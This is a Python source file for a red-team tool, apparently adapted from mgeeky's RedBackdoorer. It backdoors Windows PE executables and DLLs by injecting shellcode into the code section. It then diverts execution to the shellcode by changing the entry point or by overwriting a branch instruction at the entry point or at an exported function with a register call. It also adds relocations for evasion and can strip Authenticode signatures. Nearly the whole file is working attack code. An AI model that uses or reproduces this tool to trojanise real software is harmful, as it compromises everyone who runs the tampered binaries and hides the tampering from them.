#!/usr/bin/python3
#
# Based on: 
# Author:
#     Mariusz Banach / mgeeky '22-'23, (@mariuszbit)
#     <mb@binary-offensive.com>
#
# Requirements:
#   - pefile
#   - capstone
#   - keystone
#

import os, re, sys
import string
import shutil
import random
import tempfile
import argparse
import textwrap
import struct
import pefile
import capstone
import keystone
from enum import IntEnum
import logging

from helper import hexdump


logger = logging.getLogger("DerBackdoorer")


class PeBackdoor:
    IMAGE_DIRECTORY_ENTRY_SECURITY = 4
    IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
    IMAGE_DIRECTORY_ENTRY_TLS = 9

    IMAGE_REL_BASED_ABSOLUTE              = 0
    IMAGE_REL_BASED_HIGH                  = 1
    IMAGE_REL_BASED_LOW                   = 2
    IMAGE_REL_BASED_HIGHLOW               = 3
    IMAGE_REL_BASED_HIGHADJ               = 4
    IMAGE_REL_BASED_DIR64                 = 10

    class SupportedSaveModes(IntEnum):
        WithinCodeSection   = 1
        NewPESection        = 2

    class SupportedRunModes(IntEnum):
        ModifyOEP           = 1
        BackdoorEP          = 2

        HijackExport        = 4

    availableSaveModes = {
        SupportedSaveModes.WithinCodeSection:   'store shellcode in the middle of code section',
        SupportedSaveModes.NewPESection:        'append shellcode to the PE file in a new PE section',
    }

    availableRunModes = {
        SupportedRunModes.ModifyOEP:    'change AddressOfEntryPoint',
        SupportedRunModes.BackdoorEP:   'modify first branching instruction from Original Entry Point',
    }

    def __init__(self):
        self.pe = None
        self.shellcodeOffset = 0     # from start of the file
        self.shellcodeOffsetRel = 0  # from start of the code section
        self.backdoorOffsetRel = 0   # from start of the code section
        self.createdTlsSection = False  # TODO remove?


    def openFile(self):
        self.pe = pefile.PE(self.infile, fast_load=False)
        self.pe.parse_data_directories()

        self.ptrSize = 4
        self.arch = self.getFileArch()
        if self.arch == 'x64': 
            self.ptrSize = 8

    def getFileArch(self):
        if self.pe.FILE_HEADER.Machine == 0x014c:
            return "x86"

        if self.pe.FILE_HEADER.Machine == 0x8664:
            return "x64"

        raise Exception("Unsupported PE file architecture.")

    def backdoor(self, saveMode, runMode, shellcode, infile, outfile):
        self.saveMode = saveMode
        self.runMode = runMode
        self.shellcode = shellcode
        self.infile = infile
        self.outfile = outfile

        try:
            PeBackdoor.SupportedSaveModes(saveMode)
        except:
            logger.critical(f'Unsupported save mode specified. Please see help message for a list of available save,run modes.')

        try:
            PeBackdoor.SupportedRunModes(runMode)
        except:
            logger.critical(f'Unsupported run mode specified. Please see help message for a list of available save,run modes.')

        try:
            with open(self.shellcode, 'rb') as f:
                self.shellcodeData = f.read()

            #if len(self.options['ioc']) > 0:
            #    self.shellcodeData += b'\x00\x00\x00\x00' + self.options['ioc'].encode() + b'\x00\x00\x00\x00'

            self.openFile()

            if not self.injectShellcode():
                logger.error('Could not inject shellcode into PE file!')
                return False

            if not self.setupShellcodeEntryPoint():
                logger.error('Could not setup shellcode launch within PE file!')
                return False

            remainingRelocsSize = self.getRemainingRelocsDirectorySize()
            numOfRelocs = int((remainingRelocsSize - 8) / 2)
            logger.debug(f'Still can add up to {numOfRelocs} relocs tampering with shellcode for evasion purposes.')

            #if self.options['remove_signature']:
            #    self.removeSignature()

            logger.debug('Saving modified PE file...')
            self.pe.write(self.outfile)

            return True

        except pefile.PEFormatError:
            self.logger.warn('Input file is not a valid PE file.')
            return False

        except Exception as e:
            raise

        finally:
            self.pe.close()

    def removeSignature(self):
        addr = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress
        size = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].Size

        self.pe.set_bytes_at_rva(addr, b'\x00' * size)

        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = 0
        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].Size = 0

        logger.info('PE executable Authenticode signature removed.')
        return True
    

    def _get_code_section(self):
        entrypoint = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
        for sect in self.pe.sections:
            if sect.Characteristics & pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']:
                if entrypoint >= sect.VirtualAddress and entrypoint <= sect.VirtualAddress + sect.Misc_VirtualSize:
                    return sect
        return None
    
    def injectShellcode(self):
        if self.saveMode == int(PeBackdoor.SupportedSaveModes.WithinCodeSection):
            entrypoint = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
            sect = self._get_code_section()
            sect_name = sect.Name.decode().rstrip('\x00')
            sect_size = sect.Misc_VirtualSize  # Better than: SizeOfRawData
            if sect == None:
                return False
            
            logger.debug(f'Backdooring {sect_name} section.')

            if sect_size < len(self.shellcodeData):
                logger.critical(f'''Input shellcode is too large to fit into target PE executable code section!
Shellcode size    : {len(self.shellcodeData)}
Code section size : {sect_size}
''')

            offset = int((sect_size - len(self.shellcodeData)) / 2)
            logger.debug(f'Inserting shellcode into 0x{offset:x} offset.')

            self.pe.set_bytes_at_offset(offset, self.shellcodeData)
            self.shellcodeOffset = offset
            self.shellcodeOffsetRel = offset - sect.PointerToRawData
    
            rva = self.pe.get_rva_from_offset(offset)

            p = sect.PointerToRawData + sect.SizeOfRawData - 64
            graph = textwrap.indent(f'''
Beginning of {sect_name}:
{textwrap.indent(hexdump(self.pe.get_data(sect.VirtualAddress), sect.VirtualAddress, 64), "0")}

Injected shellcode in the middle of {sect_name}:
{hexdump(self.shellcodeData, offset, 64)}

Trailing {sect_name} bytes:
{hexdump(self.pe.get_data(self.pe.get_rva_from_offset(p)), p, 64)}
''', '\t')

            logger.info(f'Shellcode injected into existing code section at RVA 0x{rva:x}')
            logger.debug(graph)
            return True


    def setupShellcodeEntryPoint(self):
        if self.runMode == int(PeBackdoor.SupportedRunModes.ModifyOEP):
            rva = self.pe.get_rva_from_offset(self.shellcodeOffset)
            self.pe.OPTIONAL_HEADER.AddressOfEntryPoint = rva

            logger.info(f'Address Of Entry Point changed to: RVA 0x{rva:x}')
            return True

        elif self.runMode == int(PeBackdoor.SupportedRunModes.BackdoorEP):
            return self.backdoorEntryPoint()

        elif self.runMode == int(PeBackdoor.SupportedRunModes.HijackExport):
            addr = self.getExportEntryPoint()
            if addr == -1:
                logger.critical('Could not find any export entry point to hijack! Specify existing DLL Exported function with -e/--export!')

            return self.backdoorEntryPoint(addr)

        return False
    
    def getExportEntryPoint(self):
        dec = lambda x: '???' if x is None else x.decode() 

        #exportName = self.options.get('export', '')
        exportName = ""
        if len(exportName) == 0:
            logger.critical('Export name not specified! Specify DLL Exported function name to hijack with -e/--export')

        d = [pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
        self.pe.parse_data_directories(directories=d)

        if self.pe.DIRECTORY_ENTRY_EXPORT.symbols == 0:
            logger.error('No DLL exports found! Specify existing DLL Exported function with -e/--export!')
            return -1
        
        exports = [(e.ordinal, dec(e.name)) for e in self.pe.DIRECTORY_ENTRY_EXPORT.symbols]

        for export in exports:
            logger.debug(f'DLL Export: {export[0]} {export[1]}')
            if export[1].lower() == exportName.lower():

                addr = self.pe.DIRECTORY_ENTRY_EXPORT.symbols[export[0]].address
                logger.info(f'Found DLL Export "{exportName}" at RVA 0x{addr:x} . Attempting to hijack it...')
                return addr

        return -1

    def backdoorEntryPoint(self, addr = -1):
        imageBase = self.pe.OPTIONAL_HEADER.ImageBase
        self.shellcodeAddr = self.pe.get_rva_from_offset(self.shellcodeOffset) + imageBase

        cs = None
        ks = None

        if self.arch == 'x86':
            cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32 + capstone.CS_MODE_LITTLE_ENDIAN)
            ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32 + keystone.KS_MODE_LITTLE_ENDIAN)
        else:    
            cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64 + capstone.CS_MODE_LITTLE_ENDIAN)
            ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64 + keystone.KS_MODE_LITTLE_ENDIAN)

        cs.detail = True

        ep = addr

        if addr == -1:
            ep = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint

        ep_ava = ep + self.pe.OPTIONAL_HEADER.ImageBase
        data = self.pe.get_memory_mapped_image()[ep:ep+128]
        offset = 0

        logger.debug('Entry Point disasm:')

        disasmData = self.pe.get_memory_mapped_image()
        output = self.disasmBytes(cs, ks, disasmData, ep, 128, self.backdoorInstruction)

        # store offset... by calculating it first FUCK
        section = self._get_code_section()
        self.backdoorOffsetRel = output - section.VirtualAddress

        if output != 0:
            logger.debug('Now disasm looks like follows: ')

            disasmData = self.pe.get_memory_mapped_image()
            self.disasmBytes(cs, ks, disasmData, output - 32, 32, None, maxDepth = 3)

            logger.debug('\n[>] Inserted backdoor code: ')
            for instr in cs.disasm(bytes(self.compiledTrampoline), output):
                self._printInstr(instr, 1)

            logger.debug('')
            self.disasmBytes(cs, ks, disasmData, output + len(self.compiledTrampoline), 32, None, maxDepth = 3)

        else:
            logger.error('Did not find suitable candidate for Entry Point branch hijack!')

        return output

    def getBackdoorTrampoline(self, cs, ks, instr):
        trampoline = ''
        addrOffset = -1

        registers = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi']

        if self.arch == 'x86':
            registers = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi'] 

        reg = random.choice(registers).upper()
        reg2 = random.choice(registers).upper()

        while reg2 == reg:
            reg2 = random.choice(registers).upper()

        enc, count = ks.asm(f'MOV {reg}, 0x{self.shellcodeAddr:x}')
        for instr2 in cs.disasm(bytes(enc), 0):
            addrOffset = len(instr2.bytes) - instr2.addr_size
            break

        found = instr.mnemonic.lower() in ['jmp', 'je', 'jz', 'jne', 'jnz', 'ja', 'jb', 'jae', 'jbe', 'jg', 'jl', 'jge', 'jle']
        found |= instr.mnemonic.lower() == 'call'

        if found:
            logger.info(f'Backdooring entry point {instr.mnemonic.upper()} instruction at 0x{instr.address:x} into:')

            jump = random.choice([
                f'CALL {reg}',

                #
                # During my tests I found that CALL reg works stabily all the time, whereas below two gadgets
                # are known to crash on seldom occassions.
                #

                #f'JMP {reg}',
                #f'PUSH {reg} ; RET',
            ])

            trampoline = f'MOV {reg}, 0x{self.shellcodeAddr:x} ; {jump}'

        for ins in trampoline.split(';'):
            logger.info(f'\t{ins.strip()}')

        logger.info('')

        return (trampoline, addrOffset)

    def backdoorInstruction(self, cs, ks, disasmData, startOffset, instr, operand, depth):
        encoding = b''
        count = 0

        if depth < 2: 
            return 0

        (trampoline, addrOffset) = self.getBackdoorTrampoline(cs, ks, instr)

        if len(trampoline) > 0:
            encoding, count = ks.asm(trampoline)
            self.pe.set_bytes_at_rva(instr.address, bytes(encoding))

            relocs = (
                instr.address + addrOffset,
            )

            pageRva = 4096 * int((instr.address + addrOffset) / 4096)
            self.addImageBaseRelocations(pageRva, relocs)

            self.trampoline = trampoline
            self.compiledTrampoline = encoding
            self.compiledTrampolineCount = count

            logger.info('Successfully backdoored entry point with jump/call to shellcode.\n')
            return instr.address

        return 0

    def disasmBytes(self, cs, ks, disasmData, startOffset, length, callback = None, maxDepth = 5):
        return self._disasmBytes(cs, ks, disasmData, startOffset, length, callback, maxDepth, 1)

    def _printInstr(self, instr, depth):
        _bytes = [f'{x:02x}' for x in instr.bytes[:8]]
        if len(instr.bytes) < 8:
            _bytes.extend(['  ',] * (8 - len(instr.bytes)))

        instrBytes = ' '.join([f'{x}' for x in _bytes])
        logger.debug('\t' * 1 + f'[{instr.address:08x}]\t{instrBytes}' + '\t' * depth + f'{instr.mnemonic}\t{instr.op_str}')


    def _disasmBytes(self, cs, ks, disasmData, startOffset, length, callback, maxDepth, depth):
        if depth > maxDepth:
            return 0

        data = disasmData[startOffset:startOffset + length]

        for instr in cs.disasm(data, startOffset):
            self._printInstr(instr, depth)

            if len(instr.operands) == 1:
                operand = instr.operands[0]

                if operand.type == capstone.CS_OP_IMM:
                    logger.debug('\t' * (depth+1) + f' -> OP_IMM: 0x{operand.value.imm:x}')
                    logger.debug('')

                    if callback:
                        out = callback(cs, ks, disasmData, startOffset, instr, operand, depth)
                        if out != 0:
                            return out

                    if depth + 1 <= maxDepth:
                        out = self._disasmBytes(cs, ks, disasmData, operand.value.imm, length, callback, maxDepth, depth + 1)
                        return out

        if not callback:
            return 1

        return 0

    def addImageBaseRelocations(self, pageRva, relocs):
        relocType = PeBackdoor.IMAGE_REL_BASED_HIGHLOW

        if self.arch == 'x64': 
            relocType = PeBackdoor.IMAGE_REL_BASED_DIR64

        if not self.pe.has_relocs():
            logger.error("No .reloc section")
            raise(Exception("No .reloc section"))
        else:
            self.addRelocs(pageRva, relocs)

    def getSectionIndexByName(self, name):
        i = 0
        for sect in self.pe.sections:
            if sect.Name.decode().lower().startswith(name.lower()):
                return i
            i += 1

        logger.error(f'Could not find section with name {name}!')
        return -1

    def getSectionIndexByDataDir(self, dirIndex):
        addr = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[dirIndex].VirtualAddress

        i = 0
        for sect in self.pe.sections:
            if addr >= sect.VirtualAddress and addr < (sect.VirtualAddress + sect.Misc_VirtualSize):
                return i
            i += 1

        logger.error(f'Could not find section with directory index {dirIndex}!')
        return -1

    def getRemainingRelocsDirectorySize(self):
        if self.createdTlsSection:
            return 0x1000

        relocsIndex = self.getSectionIndexByDataDir(PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC)

        out = self.pe.sections[relocsIndex].SizeOfRawData - self.pe.sections[relocsIndex].Misc_VirtualSize
        return out


    def addRelocs(self, pageRva, relocs):
        assert pageRva > 0

        imageBaseRelocType = PeBackdoor.IMAGE_REL_BASED_HIGHLOW

        if self.arch == 'x64':
            imageBaseRelocType = PeBackdoor.IMAGE_REL_BASED_DIR64

        logger.info('Adding new relocations to backdoored PE file...')

        relocsSize = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].Size
        relocsIndex = self.getSectionIndexByDataDir(PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC)
        addr = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
        sizeOfReloc = 2 * len(relocs) + 2 * 4

        if sizeOfReloc >= self.getRemainingRelocsDirectorySize():
            self.logger.warn('WARNING! Cannot add any more relocations to this file. Probably TLS Callback execution technique wont work.')
            self.logger.warn('         Will try disabling relocations on output file. Expect corrupted executable though!')

            self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = 0
            self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0
            return

        relocDirRva = self.pe.sections[relocsIndex].VirtualAddress
        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].Size += sizeOfReloc

        # VirtualAddress
        self.pe.set_dword_at_rva(addr + relocsSize, pageRva)

        # SizeOfBlock
        self.pe.set_dword_at_rva(addr + relocsSize + 4, sizeOfReloc)

        logger.debug(f'Adding {len(relocs)} relocations for Page RVA 0x{pageRva:x} - size of block: 0x{sizeOfReloc:x}')

        i = 0
        for reloc in relocs:
            reloc_offset = (reloc - pageRva)
            reloc_type = imageBaseRelocType << 12

            relocWord = (reloc_type | reloc_offset)
            self.pe.set_word_at_rva(relocDirRva + relocsSize + 8 + i * 2, relocWord)
            logger.debug(f'\tReloc{i} for addr 0x{reloc:x}: 0x{relocWord:x} - 0x{reloc_offset:x} - type: {imageBaseRelocType}')
            i += 1


def opts(argv):
    epilog = '''
<runmode>
      1 - change AddressOfEntryPoint
      2 - hijack branching instruction at Original Entry Point (jmp, call, ...)
      (4 - hijack branching instruction at DLL Exported function (use -e to specify export to hook))
'''

    o = argparse.ArgumentParser(
        usage = 'RedBackdoorer.py [options] <mode> <shellcode> <infile>',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog = textwrap.dedent(epilog)
    )
    
    req = o.add_argument_group('Required arguments')
    req.add_argument('runmode', help = 'PE Injection mode, see help epilog for more details.')
    req.add_argument('shellcode', help = 'Input shellcode file')
    req.add_argument('infile', help = 'PE file to backdoor')
    
    opt = o.add_argument_group('Optional arguments')
    opt.add_argument('-o', '--outfile', metavar='PATH', default='', help = 'Path where to save backdoored output file. If not given, will modify infile.')
    opt.add_argument('-v', '--verbose', action='store_true', help = 'Verbose mode.')

    bak = o.add_argument_group('Backdooring options')
    #bak.add_argument('-n', '--section-name', metavar='NAME', default=DefaultSectionName, 
    #    help = 'If shellcode is to be injected into a new PE section, define that section name. Section name must not be longer than 7 characters. Default: ' + DefaultSectionName)
    bak.add_argument('-i', '--ioc', metavar='IOC', default='', help = 'Append IOC watermark to injected shellcode to facilitate implant tracking.')
    bak.add_argument('-e', '--export', metavar='NAME', default='', help = 'When backdooring DLLs, this specifies name of the exported function to hijack.')

    sign = o.add_argument_group('Authenticode signature options')
    sign.add_argument('-r', '--remove-signature', action='store_true', help = 'Remove PE Authenticode digital signature since its going to be invalidated anyway.')

    args = o.parse_args()
    return args

def main(argv):
    print("DerBackdoorer")
    print("   based on RedBackdoorer.py, by mgeeky")
    args = opts(argv)
    if not args:
        return False

    outfile = ''
    temp = None

    if len(args.outfile) > 0:
        outfile = args.outfile

    else:
        temp = tempfile.NamedTemporaryFile(delete=False)
        shutil.copy(args.infile, temp.name)
        outfile = temp.name
        logger.debug(f'Outfile is a temporary file: {outfile}')

    saveMode = 1  # always
    try:
        runMode = int(args.runmode)
    except:
        logger.critical(f'<mode> Most be int')

    peinj = PeBackdoor()
    result = peinj.backdoor(saveMode, runMode, args.shellcode, args.infile, outfile)

    ret = 0
    if result :
        if len(args.outfile) > 0:
            logger.info(f'Backdoored PE file saved to: {args.outfile}')
        else:
            shutil.copy(outfile, args.infile)
            logger.info(f'Backdoored PE file in place.')
    else:
        ret = 1
        logger.critical('Could not backdoor input PE file!')

    if temp:
        logger.debug('Removing temporary file...')
        temp.close()
        os.unlink(temp.name)
    
    exit(ret)

if __name__ == '__main__':
    main(sys.argv)